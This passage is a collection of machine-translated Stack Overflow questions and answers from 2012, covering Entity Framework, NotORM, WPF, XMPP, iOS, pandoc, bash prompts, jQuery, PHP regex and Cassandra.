            matrix3[i][j] += matrix1[i][k] * matrix2[k][j];
        }
    }
} 
```

# sql-server - 奇怪的实体框架错误：用户登录失败

> ID：12646899
> 
> 赞同：3
> 
> 时间：2012-09-28T20:22:43.567
> 
> 标签：sql-server, asp.net-mvc-3, linq, entity-framework

我有一个应用程序具有多个`DbContext`共享连接字符串的子类（这是为了避免 EF 使用单个大`DbContext`类型的可怕启动时间）。在某些点（对我来说是可重复的，对其他人来说有些重复），我在尝试进行数据库查询时收到以下错误：

> *System.Data.EntityException：“底层提供程序在打开时失败。”
> 内部异常：
> System.Data.SqlClient.SqlException“用户'用户名'登录失败”*

如果我切换回使用单个 Giant ，问题似乎就消失了`DbContext`。

有谁知道这意味着什么/如何解决它？如果我重复使用相同的`DbConnection`对象`DbContexts`（而不是只使用相同的连接字符串）会有帮助吗？该连接字符串已经成功地在同一个请求中进行了多次查询，因此不可能是凭据错误。

我正在使用 ASP.NET MVC 3、EF 4.3.1、.NET 4.0、VS 2010。

相关的堆栈跟踪如下：

```
 [SqlException (0x80131904): Login failed for user 'testing_net'.]
    System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection) +6351920
    System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
    System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
    System.Data.SqlClient.SqlInternalConnectionTds.CompleteLogin(Boolean enlistOK) +53
    System.Data.SqlClient.SqlInternalConnectionTds.LoginNoFailover(ServerInfo serverInfo, String newPassword, Boolean redirectedUserInstance, SqlConnection owningObject, SqlConnectionString connectionOptions, TimeoutTimer timeout) +6366878
    System.Data.SqlClient.SqlInternalConnectionTds.OpenLoginEnlist(SqlConnection owningObject, TimeoutTimer timeout, SqlConnectionString connectionOptions, String newPassword, Boolean redirectedUserInstance) +6366793
    System.Data.SqlClient.SqlInternalConnectionTds..ctor(DbConnectionPoolIdentity identity, SqlConnectionString connectionOptions, Object providerInfo, String newPassword, SqlConnection owningObject, Boolean  redirectedUserInstance) +352
    System.Data.SqlClient.SqlConnectionFactory.CreateConnection(DbConnectionOptions options, Object poolGroupProviderInfo, DbConnectionPool pool, DbConnection owningConnection) +831
    System.Data.ProviderBase.DbConnectionFactory.CreatePooledConnection(DbConnection owningConnection, DbConnectionPool pool, DbConnectionOptions options) +49
    System.Data.ProviderBase.DbConnectionPool.CreateObject(DbConnection owningObject) +6368598
    System.Data.ProviderBase.DbConnectionPool.UserCreateRequest(DbConnection owningObject) +78
    System.Data.ProviderBase.DbConnectionPool.GetConnection(DbConnection owningObject) +2194
    System.Data.ProviderBase.DbConnectionFactory.GetConnection(DbConnection owningConnection) +89
    System.Data.ProviderBase.DbConnectionClosed.OpenConnection(DbConnection outerConnection, DbConnectionFactory connectionFactory) +6372110
    System.Data.SqlClient.SqlConnection.Open() +300
    System.Data.EntityClient.EntityConnection.OpenStoreConnectionIf(Boolean openCondition, DbConnection  storeConnectionToOpen, DbConnection originalConnection, String exceptionCode, String attemptedOperation, Boolean& closeStoreConnectionOnFailure) +67

 [EntityException: The underlying provider failed on Open.]
    System.Data.EntityClient.EntityConnection.OpenStoreConnectionIf(Boolean openCondition, DbConnection storeConnectionToOpen, DbConnection originalConnection, String exceptionCode, String attemptedOperation, Boolean& closeStoreConnectionOnFailure) +11108990
    System.Data.EntityClient.EntityConnection.Open() +142
    System.Data.Objects.ObjectContext.EnsureConnection() +97
    System.Data.Objects.ObjectQuery`1.GetResults(Nullable`1 forMergeOption) +57
    System.Data.Objects.ObjectQuery`1.System.Collections.Generic.IEnumerable<T>.GetEnumerator() +47
    System.Linq.Enumerable.Single(IEnumerable`1 source) +156 
```

代码的大致轮廓如下：

```
// db context:
public class MyDbContext<T> : DbContext {
    public MyDbContext(string connectionString) : base(connectionString) { }

    protected override OnModelCreating(DbModelBuilder builder)
    {
        // constructs the model base on the type of T
        // code first POCO entities are annotated with an attribute that links
        // them to one or more types T
    }
} 
```

我使用 AutoFac 的 DI 将我的 DbContext 注入到我的数据访问层的服务中。上下文的生命周期是 HttpRequest 的长度。

实际的异常发生在对 Queryable.Single() 的调用上。

编辑：我认为[这个](https://stackoverflow.com/questions/4987787/entity-framework-giving-exception-the-underlying-provider-failed-on-open)问题可能是相关的，但我不确定如何理解所描述的竞争条件。

编辑：既然我理解了这个问题，我可以发布有问题的代码：

```
MyDbContext<T1> db1 = ...
var connectionString = db1.Database.Connection.ConnectionString; 
var dbContext2 = new MyDbContext<T2>(connectionString); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-01T23:50:15.380

事实证明，问题与 PersistSecurityInfo 连接字符串属性有关。来自 MSDN：

> PersistSecurityInfo：获取或设置一个布尔值，该值指示在连接打开或曾经处于打开状态时是否不将安全敏感信息（例如密码）作为连接的一部分返回。

我的连接字符串最初有一个用户名和密码。我会用这个字符串初始化一个 DbContext，然后在初始上下文的 Database.Connection 属性中使用相同的字符串初始化一个不同的上下文。但是，由于 PersistSecurityInfo 设置为 false，因此在某些情况下，密码会从连接对连接字符串的引用中悄然消失，从而导致新 DbContext 实例上的登录失败。

我想到的可能解决方案是： 1\. 将 PersistSecurityInfo 设置为 true 2\. 保留对连接字符串的单独引用并使用它 3\. 使用不将用户名和密码放入连接的不同形式的身份验证细绳

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-12-17T13:09:51.640

据我所知，用户应该有一些角色，即 db_datareader、db_datawriter、db_ddladmin、db_owner 或 db_securityadmin。更多角色信息请参考：

[http://msdn.microsoft.com/en-us/library/ms189121(v=SQL.105).aspx](http://msdn.microsoft.com/en-us/library/ms189121(v=SQL.105).aspx)

# php - 动态查询检索

> ID：12646902
> 
> 赞同：0
> 
> 时间：2012-09-28T20:23:06.403
> 
> 标签：php, arrays, notorm

我正在使用 NOTORM 生成查询，在应用程序中有一种情况，用户可以选择字段、条件等，因此基本上可以提出自定义查询。这样，用户可以生成一个报告，例如“名字的人 = Jack 花费 > 800”。

我正在使用 NOTORM 生成此查询，但我想存储查询以供不使用 NOTORM 的应用程序的另一部分使用。是否有任何功能可以检索生成的查询？

这是 NOTORM 对象在生成和执行查询后的样子：

```
 object(NotORM_Result)#55 (33) {
  ["single":protected]=>
  bool(false)
  ["select":protected]=>
  array(0) {
  }
  ["conditions":protected]=>
  array(7) {
    [0]=>
    string(9) "name = ? "
    [1]=>
    string(12) "surname = ? "
    [2]=>
    string(15) "custom_field_19"
    [3]=>
    string(31) "custom_field_20 BETWEEN ? AND ?"
    [4]=>
    string(21) "custom_field_18 <= ? "
    [5]=>
    string(15) "custom_field_16"
    [6]=>
    string(10) "email = ? "
  }
  ["where":protected]=>
  array(7) {
    [0]=>
    string(9) "name = ? "
    [1]=>
    string(12) "surname = ? "
    [2]=>
    string(52) "custom_field_19 IN ('Yes', 'Sent lender info', 'No')"
    [3]=>
    string(31) "custom_field_20 BETWEEN ? AND ?"
    [4]=>
    string(21) "custom_field_18 <= ? "
    [5]=>
    string(28) "custom_field_16 IN ('Buyer')"
    [6]=>
    string(10) "email = ? "
  }
  ["parameters":protected]=>
  array(6) {
    [0]=>
    string(1) "a"
    [1]=>
    string(6) "Franco"
    [2]=>
    int(1218146400)
    [3]=>
    int(1249682400)
    [4]=>
    string(3) "800"
    [5]=>
    string(1) "?"
  }
  ["order":protected]=>
  array(0) {
  }
  ["limit":protected]=>
  NULL
  ["offset":protected]=>
  NULL
  ["group":protected]=>
  string(0) ""
  ["having":protected]=>
  string(0) ""
  ["lock":protected]=>
  NULL
  ["union":protected]=>
  array(0) {
  }
  ["unionOrder":protected]=>
  array(0) {
  }
  ["unionLimit":protected]=>
  NULL
  ["unionOffset":protected]=>
  NULL
  ["data":protected]=>
  NULL
  ["referencing":protected]=>
  array(0) {
  }
  ["aggregation":protected]=>
  array(0) {
  }
  ["accessed":protected]=>
  NULL
  ["access":protected]=>
  NULL
  ["keys":protected]=>
  array(0) {
  }
  ["connection":protected]=>
  NULL
  ["driver":protected]=>
  NULL
  ["structure":protected]=>
  NULL
  ["cache":protected]=>
  NULL
  ["notORM":protected]=>
  object(NotORM)#3 (12) {
    ["connection":protected]=>
    object(PDO)#2 (0) {
    }
    ["driver":protected]=>
    string(5) "mysql"
    ["structure":protected]=>
    object(NotORM_Structure_Convention)#4 (4) {
      ["primary":protected]=>
      string(2) "id"
      ["foreign":protected]=>
      string(5) "%s_id"
      ["table":protected]=>
      string(2) "%s"
      ["prefix":protected]=>
      string(0) ""
    }
    ["cache":protected]=>
    NULL
    ["notORM":protected]=>
    NULL
    ["table":protected]=>
    NULL
    ["primary":protected]=>
    NULL
    ["rows":protected]=>
    NULL
    ["referenced":protected]=>
    array(0) {
    }
    ["debug":protected]=>
    bool(false)
    ["freeze":protected]=>
    bool(false)
    ["rowClass":protected]=>
    string(10) "NotORM_Row"
  }
  ["table":protected]=>
  string(5) "users"
  ["primary":protected]=>
  string(2) "id"
  ["rows":protected]=>
  NULL
  ["referenced":protected]=>
  array(0) {
  }
  ["debug":protected]=>
  bool(false)
  ["freeze":protected]=>
  bool(false)
  ["rowClass":protected]=>
  string(10) "NotORM_Row"
} 
```

我可以做一些迭代'where'和'parameters'的脚本，但似乎不太优雅，特别是因为这些数组的顺序不正确（我必须做一些事情，比如用下一个项目替换每个“？”在“参数”中）...任何NOTORM函数？或者您建议的任何更优雅的方式？

这是 'where' 和 'parameters' 部分，以防你对最后一个选项有一些优雅的东西：

```
 ["where":protected]=>
  array(7) {
    [0]=>
    string(9) "name = ? "
    [1]=>
    string(12) "surname = ? "
    [2]=>
    string(52) "custom_field_19 IN ('Yes', 'Sent lender info', 'No')"
    [3]=>
    string(31) "custom_field_20 BETWEEN ? AND ?"
    [4]=>
    string(21) "custom_field_18 <= ? "
    [5]=>
    string(28) "custom_field_16 IN ('Buyer')"
    [6]=>
    string(10) "email = ? "
  }
  ["parameters":protected]=>
  array(6) {
    [0]=>
    string(1) "a"
    [1]=>
    string(6) "Franco"
    [2]=>
    int(1218146400)
    [3]=>
    int(1249682400)
    [4]=>
    string(3) "800"
    [5]=>
    string(1) "?"
  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T21:00:40.880

只需将 NotORM_Result 对象转换为字符串

```
$sql = (string)$result;
//or
$sql = $result->__toString(); 
```

# .net - 更改背景不透明度而不更改内容不透明度

> ID：12646906
> 
> 赞同：26
> 
> 时间：2012-09-28T20:23:24.443
> 
> 标签：.net, wpf, opacity

我想知道如何在不影响内部子控件的情况下更改 WPF 窗口背景的不透明度。当我将窗口属性“不透明度”更改为 0.5 时，我确实得到了一个半透明窗口，但窗口内的图像也继承了 0.5 的不透明度值，那么我怎样才能只为窗口设置不透明度呢？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-09-28T20:58:11.543

窗口是所有内容的父容器，因此在窗口上设置不透明度将影响它包含的所有内容。我认为你想要做的是`Opacity`改变`Window.Background`.

使窗口具有透明度需要添加几件事。首先，您需要设置`Window.AllowsTransparency = True`并设置`Window.WindowStyle = None`. `WindowStyle.None`在窗口镶边中创建一个没有最小化、最大化和关闭按钮的窗口，因此您必须自己在应用程序中处理它以及调整窗口大小和移动窗口。完成后，您可以将其设置`Window.Background`为有一个带有`Opacity`套装的画笔。

以下代码示例将向您展示如何让窗口始终透明并将窗口背景的不透明度设置为具有不同的不透明度。

```
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        x:Class="WpfApplication1.MainWindow"
        x:Name="Window"
        WindowStyle="None"
        AllowsTransparency="True">
    <Window.Background>
        <SolidColorBrush Color="White" Opacity="0.5"/>
    </Window.Background>
    <Grid>
        <!--Window Content-->
    </Grid>
</Window> 
```

如果您只希望窗口中的元素可见，则始终可以将窗口背景设置为透明。

# xmpp - 开发聊天/实时网络应用程序

> ID：12646908
> 
> 赞同：1
> 
> 时间：2012-09-28T20:23:29.227
> 
> 标签：xmpp, chat, push, polling

我目前正在研究建立一个拥有超过 1 万在线用户的聊天系统。我遇到了一些技术和方法，例如 jabber(XMPP)、websockets、长轮询、推送。就我现在而言，考虑到用户数量，长轮询可能不起作用。我知道有很多方法可以做到这一点。我也知道 facebook 和 Google 聊天系统是在 XMPP 上开发的。

如果有人能指出我正确的方向，我将不胜感激。我相信所有这些方法和技术都很好，具体取决于项目的规模。我绝对需要性能和可扩展性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:29:00.253

我已经将[Socket.io和](http://nodejs.org)[NodeJS](http://socket.io)一起用于这样的聊天应用程序。它在中等服务器上扩展到超过 10,000 个并发用户，并且有很大的增长空间。

这确实取决于您的限制。

*   您打算使用哪种硬件？
*   哪种操作系统将为您的服务器提供动力？
*   您针对哪些客户平台？
*   您是否有需要适应的现有基础架构？
*   你有以前选择的编程语言吗？
*   您的团队成员拥有的现有技能组合以及您的团队在必要时采用新平台和语言的能力。

在做出决定时，请考虑以上所有因素。

就我个人而言，我发现 XMPP 已经足够了，但对于我的目的来说有点臃肿。YMMV。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-01T14:22:10.590

您正在比较一个水果篮和三种不同的橙子。

XMPP 是您提到的唯一一个实际上旨在支持聊天系统（其中很多存在）的协议。其他只是异步消息传递协议/技术。[XMPP 已经通过BOSH](http://xmpp.org/extensions/xep-0206.html)支持基于 http 的聊天。毫无疑问，当规范最终确定时，它也将支持 WebSockets。实际上已经编写了一个[草稿](https://datatracker.ietf.org/doc/html/draft-moffitt-xmpp-over-websocket-01)，但在这一点上，它似乎是使用草稿的草稿，因此可能很少（如果有的话）实现。

使用 XMPP 将允许您构建一个经过验证的技术来实现聊天系统，并允许您选择要“在后台”使用的传输方式。您实际上并没有说是否需要基于 http 的传输，但是使用 XMPP，您可以使用基于 tcp 套接字的传输或基于 http 的传输 (BOSH)，并且知道它将来也将支持 WebSockets。

另一个好处当然是这是一个广泛使用的标准，它将允许在几乎所有流行（而不是那么流行）的语言和平台中重用[现有的客户端、服务器和库。](http://xmpp.org/xmpp-software/)

可伸缩性与您引用的数字无关，因为大多数（可能全部）现有 xmpp 服务器将处理那么多用户。

# objective-c - iOS6 UIImage 导致崩溃

> ID：12646913
> 
> 赞同：2
> 
> 时间：2012-09-28T20:23:38.820
> 
> 标签：objective-c, uiimage, ios6

自 iOS6 以来，我对 UIImages 有一个非常奇怪的问题，导致应用程序崩溃。完整的方法是这样的：

```
NSURL *url = [NSURL URLWithString:@"http://api.twitter.com/1/users/show.json"];

NSDictionary *parametros = [NSDictionary dictionaryWithObjectsAndKeys:account.username, @"screen_name", nil];

SLRequest *request = [SLRequest requestForServiceType:SLServiceTypeTwitter
                            requestMethod:SLRequestMethodGET
                            URL:url
                            parameters:parametros];
[request setAccount:account];
[request performRequestWithHandler:^(NSData *responseData, NSHTTPURLResponse *urlResponse, NSError *error) {
        if ([urlResponse statusCode] == 200) {
            NSError *error_ = nil;
            NSDictionary *userInfo = [NSJSONSerialization JSONObjectWithData:responseData options:kNilOptions error:&error_];
            UIImage *image = [UIImage imageWithData:[userInfo objectForKey:@"profile_image_url"]];
            UIImage *image = [UIImage imageWithData:[userInfo objectForKey:@"profile_image_url"]];
            dispatch_sync(dispatch_get_main_queue(), ^{
                [_imageCache setObject:image forKey:account.username];
                [ListAccount reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:NO];
            });
        }
    }]; 
```

问题出现在这一行

```
UIImage *image = [UIImage imageWithData:[userInfo objectForKey:@"profile_image_url"]]; 
```

这在 iOS5 中没有问题。我似乎无法找到有同样问题的原因或某人。任何建议将不胜感激

崩溃如下：

```
2012-09-28 17:30:53.600 Catalogo[7321:c07] -[__NSCFString bytes]: unrecognized selector     sent to instance 0x10eaf180
2012-09-28 17:30:53.601 Catalogo[7321:c07] *** Terminating app due to uncaught exception     'NSInvalidArgumentException', reason: '-[__NSCFString bytes]: unrecognized selector sent to     instance 0x10eaf180'
*** First throw call stack:
(0x2aed012 0x1a28e7e 0x2b784bd 0x2adcbbc 0x2adc94e 0x2a75390 0x203630c 0x2035e7e 0x2035d98     0x10dc23d 0xf991f3 0xf98ef4 0x6c54e 0x1b9e731 0x1bad014 0x1b9d7d5 0x2a93af5 0x2a92f44     0x2a92e1b 0x2dd87e3 0x2dd8668 0xf7765c 0x79cd 0x2d45)
libc++abi.dylib: terminate called throwing an exception 
```

以下：

```
[userInfo objectForKey:@"profile_image_url"] 
```

返回 twitter 个人资料图片的 url

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:09:51.493

您需要转换**`[userInfo objectForKey:@"profile_image_url"]`**成`NSData`，然后将其传递给**imageWithData:**。

```
NSString * profileImageString = [userInfo objectForKey:@"profile_image_url"];
NSData * profileImageData = [profileImageString dataUsingEncoding:NSUTF8StringEncoding]; 
```

比使用：

```
UIImage *image = [UIImage imageWithData:profileImageData]; 
```

# markdown - 我在 pandoc 生成的 epub 中的目录链接不起作用

> ID：12646914
> 
> 赞同：3
> 
> 时间：2012-09-28T20:23:41.953
> 
> 标签：markdown, epub, pandoc

“# Project Info”的标题会创建一个 ID 为“project-info”的元素。然后我可以使用“#project-info”链接到它。当我只有一个文件时，这可以按预期工作。这是正在发生的事情：我有很多文件，project-a.md、project-b.md 等。

所有这些文件都具有相同的结构：

```
# Title

TOC: [Info](#project-info) | [Build](#project-build) | ...

## Project Info

## Project Build

... 
```

我正在创建一个这样的 epub：

```
pandoc -S -o projects.epub title.txt project-a.md project-b.md project-c.md 
```

问题是在生成的 epub 中，每个项目的目录链接都指向项目 a 的部分，而不是相应的项目页面。我打开了 epub，链接被渲染为：

```
<a href="ch5.xhtml#project-info">Info</a> 
```

这解释了为什么他们链接到第一个项目，但为什么将 ch5.xhtml 添加到链接中？有没有办法防止这种情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T13:47:59.773

这可能是 pandoc 中的一个错误；你应该报告 pandoc 的 github 问题跟踪器。

但是，出于您的目的，您最好使用`--toc`命令行标志，而不是手动为每章创建目录。这将导致每章以目录开头，您可以使用 CSS 设置样式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-02T14:49:38.423

Pandoc 首先将输入文件连接到一个文档中。这会创建重复的#name，因为它们现在都在一个文件中。这解释了为什么链接都跳转到第一个项目的书签。

解决方案是使#names 在所有输入文档中都是唯一的，或者`--TOC`按照 John 的建议使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-03-02T18:01:00.897

我在使用`markdown_phpextra`阅读器时遇到了这个问题。使用`markdown`阅读器工作正常。我使用了，`markdown_phpextra`因为我在某处读到链接属性扩展仅在这个中受支持，但事实并非如此。在默认`markdown`阅读器中工作正常。

# responsive-design - HTML电子邮件纵向到横向问题

> ID：12646915
> 
> 赞同：2
> 
> 时间：2012-09-28T20:23:46.857
> 
> 标签：responsive-design, media-queries, html-email

我一直在尝试解决电子邮件中的响应式设计，但我遇到了一个问题。电子邮件最初应以纵向和横向视图显示。但是，当我从横向回到纵向时，它无法正确显示。它将横向视图中的内容压缩到纵向视图中。有什么建议么？

这是链接：[http ://www3.universitybusiness.com/mailing/UBTech/2013/vendor1001.html](http://www3.universitybusiness.com/mailing/UBTech/2013/vendor1001.html)

我忘记添加的信息：我正在尝试在 Android 2.3 本机浏览器上查看它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-28T14:00:29.660

像这样设置视口元标记应该可以在浏览器上运行：

```
<meta name="viewport" content="initial-scale = 1.0,maximum-scale = 1.0" /> 
```

但是，您绝对应该在电子邮件客户端上进行测试，而不是在浏览器上。移动版 Gmail 和他的桌面版一样，是最难搞定的。

# linux - 仅当非零时才在 bash 提示符中显示作业计数

> ID：12646917
> 
> 赞同：11
> 
> 时间：2012-09-28T20:24:05.223
> 
> 标签：linux, bash, shell

bash 中的典型提示如下：

```
PS1="\u@\h:\w\$ " 
```

您可以使用 显示后台作业的数量`\j`，例如：

```
PS1="\u@\h:\w [\j]\$ " 
```

这很有用，因为我时不时忘记我有一个停止的工作，并且只有在我手动从 shell 注销时才会注意到它抱怨。

但是，在 95% 的情况下，后台作业计数为 0，在提示中显示它是多余的。

如何在提示中显示作业计数，但前提是它不为零？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-28T20:29:17.723

例如，您可以执行以下操作：

```
PS1='\u@\h:\w $([ \j -gt 0 ] && echo [\j])\$ ' 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-24T12:05:48.633

接受的答案对我不起作用（我有 Bash v4.2.46）。它会抛出这样的错误：

```
[: \j: integer expression expected 
```

我不得不使用 PROMPT_COMMAND 来实现相同的功能：

```
export PROMPT_COMMAND=__prompt_command
function __prompt_command() {
    local JOBS=$(jobs | wc -l | tr -d 0)
    PS1="\u@\h:\w [${JOBS}]\$ "
} 
```

# jquery - 使用jquery淡入后表格行的背景颜色闪烁

> ID：12646924
> 
> 赞同：1
> 
> 时间：2012-09-28T20:24:38.140
> 
> 标签：jquery, cell, fadein, background-color

嗯，这是你能得到的最基础的东西！我在表格末尾插入一行并立即将其隐藏。添加单元格后，我对背景进行着色，交替使用浅绿色和白色。我也有一些交替的蓝色和白色用于密集填充的列。文本淡入淡出，但一旦完成，背景颜色会闪烁一两秒钟。显然，这会消除“它一定是业余之夜”的“哇”因素。

更新：创建了一个演示表来显示效果......有点（它现在只适用于 FF）。如果您在表格上设置了border="1"，那么当您添加一行时，一切看起来都很好，整个单元格都是蓝色或绿色。如果将边框设置为 0，您会看到单元格周围的区域变为白色，然后变回原来的颜色。所以看起来最后渲染的是边框。

但是，这并不是我看到的效果。在我的表格中，单元格的*整个*背景都像这样闪烁。文本和一些颜色淡入 1/2 秒，然后背景变白 1/2 秒，然后变回颜色。

UPDATE2：我把单元格做得更大了，所以你可以看到它是整个背景，除了文字后面会改变颜色。如果将边框更改为“1”，它会按预期工作。

```
<style type="text/css">
table#demo  {
  border-collapse: collapse;
  border-spacing:  0px;
  border-style:    none;
  font-size:       10px;
}

table#demo th {
  font-size:      10px;
  text-align:     center;
  vertical-align: bottom;
  border-style:   none;
    border-width:   0px;
}

table#demo td {
  font-size:       10px;
  text-align:      left;
  vertical-align:  top;
  text-decoration: none;
  font-weight:     none;
  padding:         0px 8px 0px 8px;
  border-style:    none;
  border-width:    0px;
}

.even_row2 {
  background-color: lightblue;
}
.odd_row2 {
  background-color: lightgreen;
}
</style>

<table id="demo_table" class="demo" border="1">
<thead>
<tr>
  <th width="75px">col 1</th>
  <th width="75px">col 2</th>
  <th width="75px">col 3</th>
</tr>
</thead>
<tbody>
</tbody>
</table>
<input type="button" onclick="addRow();" value="Add a row">

<script type="text/javascript">

var demoRowCnt=0;
function addRow() {

  ++demoRowCnt;

  var tbody = document.getElementById('demo_table').getElementsByTagName('tbody')[0];
  var rowObj = tbody.insertRow(tbody.rows.length);   
  $(rowObj).hide(); 

  var colNo = -1;
  var cell   = rowObj.insertCell(++colNo);
  cell.innerHTML = 'r' + demoRowCnt + ' c1';  

  cell   = rowObj.insertCell(++colNo);
  cell.innerHTML = 'r' + demoRowCnt + ' c2';  

  cell   = rowObj.insertCell(++colNo);
  cell.innerHTML = 'r' + demoRowCnt + ' c3';  

  // my colorRows function:
  var rowStyle = 'even_row2';

  for ( var r=0; r<tbody.rows.length; ++r ) {
    rowStyle = ( rowStyle == 'even_row2' ) ? 'odd_row2' : 'even_row2';
    var str = ( MSIE ) ? 'className' : 'class';
    tbody.rows[r].setAttribute('class', rowStyle);

  }

  $(rowObj).fadeIn("slow"); 

}
</script> 
```

# php - 如何从PHP会话中的文本文件中输出字符串数组的一部分

> ID：12646927
> 
> 赞同：0
> 
> 时间：2012-09-28T20:24:49.873
> 
> 标签：php, html, regex, validation, session

我的页面允许用户从 .php 脚本打开的列表中选择他们希望参加的课程列表。用户选择的选项被设置为名为 courses[] 的复选框数组。一个 Result.php，选择的选项通过 RegEx 发送，以提取课程名称和每门课程所需的时间。课程名称仅在小时数相加时输出，以显示每周所需的总小时数。

**我的问题是，我已经修复了所有语法，但是当我调用我的 printf 格式时没有返回任何内容。我尝试了 var_dump($courses) 和 ($courseLine)，结果显示为 NULL 和 NULL。我想我在 Registration.php 上有一个逻辑错误，但我找不到在哪里。** *下面是我的 Result.php，我将包含课程列表文本文件的示例*

```
<table><tr><th>Courses</th><th>hours per Week</th></tr>
<?php
                $courses = $_GET['courses'];
                $courseHoursRegEx = "/\s[0-9]{1,2}\shrs/w/";//needs work
                $courseNameRegEx = "/[a-zA-Z]{3}[0-9]{4}[A-Z]{0,1}\s?/[a-zA-Z]{3,40}/";

    function GetCourseHours($couseLine)
    {
        if(!preg_match($courseHoursRegEx, $courseLine))
            {
                return $courseHour;
            }
        $totalHours += $courseHour;
    }
    function GetCourseName($courseLine)
    {
        if(!preg_match($courseNameRegEx, $courseLine))
            {
                return $courseInfo;
            }
    }
                foreach($courses as $course)
                        {
                            $theCourse = GetCourseName($course);
                            $theHours = GetCourseHours($course);
                        }
                for($i = 1; $i <= $courses; ++$i)
                {
                    printf("<tr><td>\%</td><td>\%</td></tr>", $theCourse, $theHours);
                }
?>
                <tr>
                <th>Total Hours</th><td><?php echo $totalHours ?>        </td></tr>
                </table> 
```

**这是我的起始页面，因此您知道使用了哪些值（由于脚本的长度，我没有包括验证函数。）**

```
 </table>
<?php 
    $courseFile = fopen("CourseList.txt", "r");
    $courseHoursRegEx = "/\s[0-9]{1,2}\shrs/w/";
    $courseNameRegEx = "/[a-zA-Z]{3}[0-9]{4}[A-Z]{0,1}\s?/[a-zA-Z]{3,40}/";

    while(!feof($courseFile))
        {
            $courseLine = fgets($courseFile);
            echo "<input type='checkbox' name='courses[]' value='$courseLine'/> $courseLine <br />";
        }
        fclose($courseFile);
    function GetCourseHours($courseLine)
    {
        if(!preg_match($courseHoursRegEx, $courseLine))
            {
                return $courseLine;
            }
    }
    function GetCourseName($courseLine)
    {
        if(!preg_match($courseNameRegEx, $courseLine))
            {
                return $courseLine;
            }
    }
?> 
```

**这是带有课程信息的文本文件的示例**

```
CON8101 Residential Building/Estimating 16 hrs/w 
CON8411 Construction Materials I 4 hrs/w 
CON8430 Computers and You 4 hrs/w 
MAT8050 Geometry and Trigonometry 4 hrs/w 
SAF8408 Health and Safety 5 hrs/w 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T02:11:16.727

[`=+`不是有效的 php 运算符尝试`+=`](http://php.net/manual/en/language.operators.php)如果您使用数字，请尝试`+=`如果字符串使用`.=`. 希望有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:38:55.103

虽然没有具体回答您的问题，但请尝试在文件的每一行上使用以下正则表达式；

```
preg_match('/(?P<courseid>[A-Z0-9]+) (?P<coursename>.*) (?P<coursehours>\d+) hrs/',$text,$matches); 
```

这将在这种情况下创建一个数组`$matches`，然后您可以更随意地引用元素

```
Array
(
    [0] => CON8101 Residential Building/Estimating 16 hrs
    [courseid] => CON8101
    [1] => CON8101
    [coursename] => Residential Building/Estimating
    [2] => Residential Building/Estimating
    [coursehours] => 16
    [3] => 16
) 
```

这将极大地简化您的代码和附加功能。

# ios - UITextInteractionAssistant 错误_forgetDependentConstraint

> ID：12646933
> 
> 赞同：0
> 
> 时间：2012-09-28T20:25:08.927
> 
> 标签：ios, automatic-ref-counting, ios6

我遇到了一个严重的错误，导致我的应用程序崩溃，而谷歌没有给出任何提示。我想知道这里是否有人可以提供帮助。[我从这里](https://github.com/lashad/PTPasscodeViewController)使用 PTPasscodeViewController 。自 2010 年以来我一直在使用它。我正在为 ios6 和 iphone 5 更新我的应用程序。我开始将我的应用程序更改为 ARC，但将 PTPasscodeViewController 保留为 -fno-obj-arc。

但是，每次我访问密码视图页面时，我的模拟器都会崩溃，控制台中的错误消息很少。但是有一次，我收到以下消息：

> ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[UITextInteractionAssistant _forgetDependentConstraint:]：无法识别的选择器发送到实例 0xa554500”

这是我不明白的事情。如果我在委托方法中设置断点：

```
- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string 
```

我实际上可以设置密码。每次我在文本字段中输入一个值时，它都会触发该方法，我必须继续断点 4 次，但它可以工作。

如果您有任何建议或指示，请告诉我。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-24T04:52:33.863

我从视图中禁用了自动布局，它对我有用

# cassandra - 复合列查询 - 仅指定一个组件

> ID：12646941
> 
> 赞同：1
> 
> 时间：2012-09-28T20:25:38.347
> 
> 标签：cassandra, command-line-interface, hector

我有一个 ColumnFamily ，其中包含一个复合列，其中包含 2 个整数列。我想用仅指定一个组件的 Hector 查询该列族。可能吗？我已经尝试过了，但它没有返回任何结果

```
 MultigetSliceQuery<String, Composite, Object> msq = HFactory.createMultigetSliceQuery(dealsReadKeySpace,stringSerializer, compSerializer, objSerializer);
        msq.setKeys(keysList);

        Composite start = new Composite();

        start.addComponent(searchParameter.getStarRating(), intSerializer);

        msq.setColumnNames(start);
        QueryResult<Rows<String, Composite, Object>> result = msq.execute(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T17:33:56.367

您需要在构造起始值时指定所有组件值。我建议您为第二个整数组件使用一个值，该值是以下值之一：

*   第二个值的已知最小值
*   一个非常小的整数，以至于你是正数（没有双关语），它小于任何复合列名称的任何第二个值，或者
*   可能的最小整数

# asp.net - 使用 Azure Blob 存储中的 ascx 文件

> ID：12646944
> 
> 赞同：1
> 
